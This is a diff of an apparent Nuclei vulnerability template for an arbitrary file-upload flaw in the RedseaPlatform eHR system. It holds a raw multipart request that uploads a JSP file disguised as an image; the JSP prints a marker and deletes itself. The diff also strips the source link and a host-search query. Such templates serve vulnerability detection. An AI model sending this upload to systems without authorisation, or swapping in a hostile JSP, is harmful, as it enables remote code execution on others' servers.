@@ -3,12 +3,8 @@ info:
   name: 红海云ehr-RedseaPlatform-文件上传-PtFjk
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/ubnwgt6qpn20cmds'
+  description: ''
   tags: file-upload,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: ubnwgt6qpn20cmds
-    fofa: body="RedseaPlatform"
 http:
 - raw:
   - 'POST /RedseaPlatform/PtFjk.mob?method=upload HTTP/1.1
@@ -26,8 +22,6 @@ http:
     Content-Type: multipart/form-data; boundary=---------------------------3dtd6inedsrglfna4uqp
 
 
-
-
     -----------------------------3dtd6inedsrglfna4uqp
 
 
@@ -37,11 +31,7 @@ http:
     Content-Type: image/jpeg
 
 
-
-
     <% out.println("dudesite");new java.io.File(application.getRealPath(request.getServletPath())).delete(); %>
-
-
 
 
     -----------------------------3dtd6inedsrglfna4uqp--
